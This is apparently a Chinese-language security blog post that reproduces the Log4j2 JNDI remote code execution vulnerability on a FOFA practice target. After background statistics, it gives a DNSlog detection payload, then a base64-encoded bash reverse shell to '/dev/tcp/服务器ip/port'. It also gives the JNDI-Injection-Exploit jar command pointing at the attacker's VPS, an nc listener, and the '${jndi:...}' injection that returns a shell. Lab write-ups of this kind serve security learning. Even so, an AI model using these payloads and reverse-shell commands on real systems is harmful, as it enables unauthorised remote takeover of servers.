# LOG4j2（CNVD-2021-95914）漏洞复现

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg4NjUzODYyNw==&mid=2247483933&idx=1&sn=e5a2ed96c6ba34a6ae920283cca16e4f&chksm=cf996af1f8eee3e78159eceef8b0e3e52b0fd38ca0b3e35fd8b5bd46327a772a83dea05628f4&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=Mzg4NjUzODYyNw==&mid=2247483933&idx=1&sn=e5a2ed96c6ba34a6ae920283cca16e4f&chksm=cf996af1f8eee3e78159eceef8b0e3e52b0fd38ca0b3e35fd8b5bd46327a772a83dea05628f4&scene=27#wechat_redirect)

  

Log4j2漏洞的曝光，便在全球掀起轩然大波，其危害性极大，甚至强大到指哪打哪的，这就是今天的主题log4j2。Apache Log4j是一个基于Java的日志记录组件。Apache Log4j2是Log4j的升级版本，通过重写Log4j引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。  
  
Apache Log4j2存在远程代码执行漏洞，攻击者可利用该漏洞向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。  
据 CPR 统计，在 Apache Log4j 2 漏洞发现早期的 12 月 10 日，黑客尝试利用该漏洞进行攻击的次数仅有几千次，但这一数据在隔天却增至 4 万次。而截至 Check Point 发布该报告，即**漏洞爆发 72 小时后，仅 CPR 传感器捕捉到利用该漏洞尝试攻击的行为就已超过 83 万次**：

![](../Images/05abee100ab5202b93382fa8bbbe92d0.png)

  

不仅攻击次数在持续攀升，基于**该漏洞的新变种也在短时间内迅速衍生，截至报告发布已超过 60 种**：

![](../Images/0a276830aa7cba521a0312fc6f4a2f42.png)

基于这两个现象，Check Point 认为此次 Apache Log4j 2 漏洞具备“网络流行病”的特征——迅速传播毁灭性攻击。Check Point 表示：“**它显然是近年来互联网上最严重的漏洞之一，其潜在危害是无法估量的**。” （数据内容出处：https://view.inews.qq.com/a/20211216A09BJY00）

  

我们熟知的apple公司官网也存在该漏洞。附图：

![](../Images/83ac08b93e7e944394418d04217d7464.png)

  

该漏洞最早是阿里云安全团队发现的，该漏洞对apche log4j 2.14.\*到2.15.\*的版本都有危害。漏洞曝光的第一时间，我们网络安全技术协会也第一时间组织了人员对该漏洞进行复现，话不多说，接下来我们利用fofa的log4j2的靶场给大家复现这个漏洞。

## 一、首先我们对该漏洞进行验证

  

根据提示打开网页的/hello

![](../Images/31d1fb77fc6f3fc21b5279496870a14f.png)

打开burp对该页面进行抓包

  

![](../Images/66f96fc0ff09acb2acb00baed5b02c9b.png)

  

把该数据包修改成post方式

![](../Images/3f1bb1dba2e0aaed4a9c649667bbf58a.png)

此处需要使用到dnslog，打开dnslog网站 http://www.dnslog.cn/

获取子域

![](../Images/08fe1ec9ef43d7346ebd26cec96f402b.png)

把获取到的子域编写成payload

payload=${jnde:ldap:// uqjjuk.dnslog.cn}

把该payload参数写入数据包中

![](../Images/bba72e81d0822963f9e4d718441e8bd7.png)

用burp重放功能把包放出

![](../Images/d254c8745cfe933de605d51bb2e8b48e.png)

回到dnslog网站点击该按钮查看回显

![](../Images/4ff43a05f9d81b2c71b3e5acd40256b7.png)

  

  

有回显说明存在该漏洞

  

## 二、验证了该漏洞存在接下来我们开始进行复现

首先下载DI-Injection-Exploit-1.0-SNAPSHOT-all.jar存放到自己的服务器(https://github.com/d-rn/vulBox/blob/main/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar）

![](../Images/b53cc64fcda358531221cad711e4a6e2.png)

该shell反弹使用到nc  如若自己未安装nc 先使用yum进行安装

构造payload 将bash -i 反弹语句进行base64编码

原句：bash -I >&/dev/tcp/服务器ip/监听端口 0>&1

![](../Images/64c29e0f99eaad624e4d50190d14ad7b.png)

然后到服务器中利用 刚才下载的 Jndi注入工具构造反弹shell命令(-A 后面为VPS服务器地址)

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4xLzMyMTUgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "服务器ip”

标红部分为反弹语句base64加密后的该命令需要去到JDK所在目录下执行

构造完之后就开启服务并监听nc反弹端口(就是base64编码中的nc监听端口)

![](../Images/dea2b6e2ab93e5f98a1fb7b007965555.png)

  

再打开一个窗口查看反弹

命令 nc -lvvp 3215

![](../Images/c16f3d32d24e921efaf15934faab6022.png)

  

把回显信息中红色的payload复制到页面以post方式提交

将红色字体的payload复制到页面以post方式提交

格式为**payload=${jndi:复制的payload}**

![](../Images/dd8649c616864cb4ac81b634338dc00a.png)

发出数据包以后查看监听端口的服务器

  

![](../Images/1fb1fa4f99b0bda75f780918c7022a6a.png)

成功弹回shell证明漏洞复现成功
